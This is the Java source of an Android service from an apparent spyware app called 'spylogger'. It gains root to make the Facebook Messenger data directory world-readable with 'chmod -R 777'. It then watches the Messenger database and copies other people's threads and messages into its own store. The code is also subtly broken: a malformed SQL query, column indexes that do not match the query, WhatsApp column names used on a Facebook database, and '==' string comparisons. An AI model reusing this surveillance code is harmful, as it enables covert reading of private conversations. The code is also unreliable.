package com.gravatasufoca.spylogger.services;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Binder;
import android.os.FileObserver;
import android.os.IBinder;
import android.util.Log;

import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookThreads;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperInternal;
import com.gravatasufoca.spylogger.model.Configuracao;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.model.messenger.Messages;
import com.gravatasufoca.spylogger.utils.Utils;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.GenericRawResults;
import com.j256.ormlite.stmt.QueryBuilder;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class MessengerService extends Service {

	private String pathToWatch;
	private String inFileName;
	private Dao<Messages, Integer> daoMsgExternal;

	private DatabaseHelper dbHelper;

	private DatabaseHelperFacebookThreads external;
	private Configuracao configuracao;
    private final IBinder mBinder = new LocalBinder();
    private boolean loaded=false;

    public class LocalBinder extends Binder {
    	MessengerService getService() {
            return MessengerService.this;
        }
    }

	public MessengerService() {
	}

	@Override
	public IBinder onBind(Intent intent) {
		return mBinder;
	}

	private void chmod() {

		try{
			CommandCapture command = new CommandCapture(0, "chmod -R 777 "
				+ Utils.FACEBOOK_DIR_PATH, "chmod -R 777 "
						+ getApplicationContext().getPackageManager()
						.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir);

			if(RootTools.isAccessGiven())
				RootTools.getShell(true).add(command);

		}catch(Exception e){
			e.printStackTrace();
		}

	}

	@Override
	public void onCreate() {
		pathToWatch = DatabaseHelperFacebookThreads.DATABASE_NAME;
		try {
			inFileName = getApplicationContext().getPackageManager()
                    .getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
                    + "/databases/"+DatabaseHelperInternal.DATABASE_NAME;
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}

		chmod();
	}



	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		Log.d("FACESLOG - FLAGS", Integer.toString(flags));

		updateMsg();

		if(Utils.faceObserver==null)
			setObserver();

		Log.d("FACESLOG - OBSESRVER", Utils.faceObserver.toString());
		return START_REDELIVER_INTENT;
	}

	private void setObserver(){
		Utils.faceObserver = new FileObserver(pathToWatch) { // set up a file observer to
			// watch this directory on
			// sd card

			@Override
			public void onEvent(int event, String file) {

				switch (event) {
				case FileObserver.MODIFY:
					Log.d("FACES LOGGER", "MODIFY:" + pathToWatch + file);
					updateMsg();
					break;
				default:
					// just ignore
					break;
				}

			}
		};
		Utils.faceObserver.startWatching(); // START OBSERVING
	}



	private void updateMsg() {

		external = new DatabaseHelperFacebookThreads(getApplicationContext());
		dbHelper = new DatabaseHelper((getApplicationContext()));

		try {
			daoMsgExternal = external.getMessagesDao();

			daoMsgExternal.executeRaw("attach database '"+inFileName+"' as 'localdb' ");


			GenericRawResults<String[]> raws= daoMsgExternal.queryRaw("select msg_id, thread_key, from threads where msg_id not in( select idReferencia from localdb.topico )");
			List<Topico> topicos=new ArrayList<>();

			for(String[] resultRaw:raws){
				Topico topico=new Topico.TopicoBuilder()
						.setIdReferencia(resultRaw[0])
						.setRemoteKey(resultRaw[1])
						.setNome(resultRaw[2])
						.setOrdenacao(new Date(Long.parseLong(resultRaw[3]))).build();

				topicos.add(topico);
			}
			dbHelper.getTopicoDao().create(topicos);

			GenericRawResults<String[]> rawResults= daoMsgExternal.queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end from messages where _id!=-1 and _id not in( select idReferencia from localdb.mensagem )");
			List<Mensagem> mensagems=new ArrayList<>();
			for(final String[] resultRaw:rawResults){
				Topico tmpTopico=null;
				for(Topico topico: topicos) {
					if(topico.getRemoteKey().equals(resultRaw[1])) {
						tmpTopico=topico;
						break;
					}
				}

				Mensagem mensagem = new Mensagem.MensagemBuilder()
						.setIdReferencia(resultRaw[0])
						.setRemetente(resultRaw[2] == "1")
						.setTexto(resultRaw[3])
						.setData(new Date(Long.parseLong(resultRaw[4])))
						.setDataRecebida(new Date(Long.parseLong(resultRaw[8])))
						.setTamanhoArquivo(Long.parseLong(resultRaw[6]))
						.setTipoMidia(TipoMidia.getTipoMidia(resultRaw[5]))
						.setContato(resultRaw[7])
						.setTopico(tmpTopico)
						.setTemMedia(resultRaw[9] == "1").build();

				if(tmpTopico==null){
					QueryBuilder<Topico,Integer> qb=dbHelper.getTopicoDao().queryBuilder();
					qb.where().eq("remoteKey",resultRaw[1]);
					tmpTopico=dbHelper.getTopicoDao().queryForFirst(qb.prepare());
					mensagem.setTopico(tmpTopico);
				}
				mensagems.add(mensagem);
			}

			dbHelper.getMensagemDao().create(mensagems);


		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}